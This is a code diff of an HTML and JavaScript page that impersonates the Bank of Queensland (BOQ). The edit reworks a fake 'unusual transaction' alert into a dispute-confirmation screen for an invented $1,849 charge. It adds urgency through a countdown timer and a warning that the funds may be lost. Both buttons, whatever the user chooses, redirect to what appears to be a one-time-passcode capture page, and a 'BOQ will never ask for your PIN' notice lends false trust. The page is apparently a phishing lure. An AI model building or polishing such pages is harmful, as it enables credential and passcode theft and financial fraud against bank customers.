@@ -750,92 +750,88 @@
             </div>
         </div>
 
-        <!-- ── Verification card ── -->
+        <!-- ── Email-style verification card ── -->
         <div class="card" id="card-verify">
 
-            <div class="card-header">
-                <div class="header-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                        <path d="M12 8v4" />
-                        <path d="M12 16h.01" />
-                    </svg>
+            <!-- Email header -->
                 </div>
-                <div class="header-text">
-                    <h1>Unusual transaction detected</h1>
-                    <p>Please review and confirm this international transaction</p>
-                </div>
-            </div>
-
-        
-
-            <div class="txn-block">
-                <div class="txn-top">
-                    <div>
-                        <div class="txn-merchant">Al Maya Group</div>
-                        <div class="txn-category">POS · Card not present</div>
-                    </div>
-                    <div>
-                        <div class="txn-amount">−$1,849.00</div>
-                        <div class="txn-currency">Australian Dollars</div>
-                    </div>
-                </div>
-                <div class="txn-details">
-                    <div class="txn-detail"><label>Date</label><span>18 Jun 2026</span></div>
-                    <div class="txn-detail"><label>Card Type</label><span>Debit Card</span></div>
-                    <div class="txn-detail"><label>Merchant location</label><span>Dubai Silicon Oasis, UAE</span></div>
-                    <div class="txn-detail"><label>Transaction ID</label><span>BOQ-20260617-8849</span></div>
+                <div class="email-subject">Dispute confirmation — international transaction</div>
                 
+            </div>
+
+                <!-- Transaction summary -->
+                <div class="txn-block-email">
+                    <div class="txn-top-email">
+                        <div>
+                            <div class="txn-merchant-email">Al Maya Group</div>
+                            <div class="txn-category-email">POS · Card not present · International</div>
+                        </div>
+                        <div>
+                            <div class="txn-amount-email">−$1,849.00</div>
+                            <div class="txn-currency-email">Australian Dollars</div>
+                        </div>
+                    </div>
+                    <div class="txn-details-email">
+                        <div class="txn-detail-email"><label>Date</label><span>18 Jun 2026</span></div>
+                        <div class="txn-detail-email"><label>Card Type</label><span>Debit Card</span></div>
+                        <div class="txn-detail-email"><label>Merchant location</label><span>Dubai Silicon Oasis, UAE</span></div>
+                        <div class="txn-detail-email"><label>Dispute ID</label><span>BOQ-DIS-20260617-8849</span></div>
+                    </div>
                 </div>
+
+                <!-- PS note -->
+                <div class="ps-note">
+                    <strong>PS:</strong> Just a reminder — If we do not receive your response, we may be unable to continue your claim, and the disputed funds may be returned to the merchant.
+                </div>
+
             </div>
 
+            <div class="section-divider-email"></div>
 
-            <div class="section-divider"></div>
-
-            <div class="question-block">
-                <h2>Did you make this transaction?</h2>
-                <p>If you don't recognise this payment, we'll block the transaction and secure your card from any further charges.</p>
+            <!-- Question + action buttons -->
+            <div class="question-block-email">
+                <h2>Did you authorise this transaction?</h2>
+                <p>To continue the dispute, please confirm that you did <strong>not</strong> make this payment. If you did authorise it, the dispute will be closed.</p>
             </div>
 
-            <div class="btn-group">
-                <button class="btn btn-confirm" onclick="handleConfirm()" id="btn-yes">
+            <div class="btn-group-email">
+                <button class="btn btn-confirm-dispute" onclick="handleConfirm()" id="btn-confirm">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
-                    Yes, it was me
+                    No — I did not authorise it
                 </button>
-                <button class="btn btn-deny" onclick="handleDeny()" id="btn-no">
+                <button class="btn btn-authorize" onclick="handleDeny()" id="btn-authorize">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
-                    No, block it
+                    Yes — I authorised it
                 </button>
             </div>
 
-            <div class="security-note">
+            <div class="security-note-email">
                 <span class="security-note-icon">🔒</span>
                 <span>BOQ will <strong>never</strong> ask for your password, PIN, or security code. If someone asks for these, hang up and call us on <strong>13 00 555 722</strong>.</span>
             </div>
 
         </div>
 
-        <!-- ── Confirmed result ── -->
+        <!-- ── Confirmed (dispute continues) ── -->
         <div class="card" id="card-confirmed" style="display:none;">
             <div class="result-screen" style="display:flex;">
                 <div class="result-icon-ring" style="background:var(--green-bg);">
                     <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
                 </div>
-                <h2 style="color:var(--green);">Transaction confirmed</h2>
-                <p>Thank you for verifying. The payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong> has been approved and will be processed shortly.</p>
-                <p>Your card remains active and no further action is needed.</p>
+                <h2 style="color:var(--green);">Dispute confirmed</h2>
+                <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>.</p>
+                <p>Your dispute will proceed. We'll contact you with the outcome within 5–10 business days.</p>
                 <div class="result-ref">
-                    <strong>Reference:</strong> BOQ-20260617-8849 &nbsp;·&nbsp;
+                    <strong>Dispute ID:</strong> BOQ-DIS-20260617-8849 &nbsp;·&nbsp;
                     <strong>Confirmed:</strong> <span id="confirm-time"></span>
                 </div>
-                <button class="btn-next-steps btn-denied-next"
-        onclick="window.location.href='ex-otp/boq-otp.html';">
-    Continue
-</button>
+                <button class="btn-next-steps btn-confirmed-next" onclick="window.location.href='ex-otp/boq-otp.html';">
+                    Continue to myBOQ
+                </button>
             </div>
         </div>
 
-        <!-- ── Denied result ── -->
+        <!-- ── Denied (dispute closed) ── -->
         <div class="card" id="card-denied" style="display:none;">
             <div class="card-header" style="background:var(--red);">
                 <div class="header-icon">
@@ -846,28 +842,28 @@
                     </svg>
                 </div>
                 <div class="header-text">
-                    <h1>Transaction blocked</h1>
-                    <p>We've stopped this payment and secured your account.</p>
+                    <h1>Dispute closed</h1>
+                    <p>You confirmed you authorised this transaction.</p>
                 </div>
             </div>
             <div class="result-screen" style="display:flex; padding-top: 28px;">
                 <div class="result-icon-ring" style="background:var(--red-bg);">
                     <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C0392B" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                        <line x1="12" y1="9" x2="12" y2="13" />
-                        <circle cx="12" cy="17" r="0.5" fill="#C0392B" stroke="none" />
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="12" x2="16" y2="16" />
+                        <line x1="12" y1="12" x2="8" y2="16" />
                     </svg>
                 </div>
-                <h2>Your card has been secured</h2>
-                <p>Payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong> has been <strong>blocked</strong>. Your card remains active and no further action is needed.</p>
-                
-                <div class="result-ref" style="text-align:left; font-size:13px; color:var(--text-secondary); max-width:380px;">
-                    </span>
+                <h2>Dispute closed</h2>
+                <p>You have confirmed that you <strong>did authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>. The dispute has been closed.</p>
+                <p>The funds will not be returned. If this was a mistake, please contact us immediately.</p>
+                <div class="result-ref">
+                    <strong>Dispute ID:</strong> BOQ-DIS-20260617-8849 &nbsp;·&nbsp;
+                    <strong>Closed:</strong> <span id="deny-time"></span>
                 </div>
-                <button class="btn-next-steps btn-denied-next"
-        onclick="window.location.href='ex-otp/boq-otp.html';">
-    Continue
-</button>
+                <button class="btn-next-steps btn-denied-next" onclick="window.location.href='ex-otp/boq-otp.html';">
+                    Continue to myBOQ
+                </button>
             </div>
         </div>
 
@@ -916,12 +912,12 @@
             });
         }
 
-        // ── Confirm handler ──
+        // ── Confirm handler (did NOT authorise → dispute continues) ──
         function handleConfirm() {
-            const btn = document.getElementById('btn-yes');
-            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Processing…';
+            const btn = document.getElementById('btn-confirm');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Confirming…';
             btn.disabled = true;
-            document.getElementById('btn-no').disabled = true;
+            document.getElementById('btn-authorize').disabled = true;
             setStep(2);
 
             setTimeout(() => {
@@ -937,43 +933,46 @@
             }, 1400);
         }
 
-        // ── Deny handler ──
+        // ── Deny handler (did authorise → dispute closed) ──
         function handleDeny() {
-            const btn = document.getElementById('btn-no');
-            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Blocking…';
+            const btn = document.getElementById('btn-authorize');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Closing dispute…';
             btn.disabled = true;
-            document.getElementById('btn-yes').disabled = true;
+            document.getElementById('btn-confirm').disabled = true;
             setStep(2);
 
             setTimeout(() => {
                 document.getElementById('card-verify').style.display = 'none';
                 document.getElementById('card-denied').style.display = 'block';
+                document.getElementById('deny-time').textContent = new Date().toLocaleTimeString('en-AU', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
                 setStep(3);
                 clearInterval(tick);
                 timerEl.textContent = '—';
             }, 1400);
         }
 
-        // ── Return home ──
+        // ── Return home (hidden helper) ──
         function returnToHome() {
             document.getElementById('card-confirmed').style.display = 'none';
             document.getElementById('card-denied').style.display = 'none';
             document.getElementById('card-verify').style.display = 'block';
-            document.getElementById('btn-yes').disabled = false;
-            document.getElementById('btn-no').disabled = false;
-            document.getElementById('btn-yes').innerHTML = `
+            document.getElementById('btn-confirm').disabled = false;
+            document.getElementById('btn-authorize').disabled = false;
+            document.getElementById('btn-confirm').innerHTML = `
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
-                Yes, it was me
+                No — I did not authorise it
             `;
-            document.getElementById('btn-no').innerHTML = `
+            document.getElementById('btn-authorize').innerHTML = `
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
-                No, block it
+                Yes — I authorised it
             `;
             setStep(1);
             seconds = 598;
             timerEl.classList.remove('warning');
             timerEl.textContent = '09:58';
-            // Restart timer
             clearInterval(tick);
             const newTick = setInterval(() => {
                 if (seconds <= 0) {
@@ -989,11 +988,6 @@
             }, 1000);
             window._timerInterval = newTick;
         }
-
-        // Add spin animation
-        const style = document.createElement('style');
-        style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
-        document.head.appendChild(style);
 
         window._timerInterval = tick;
     </script>
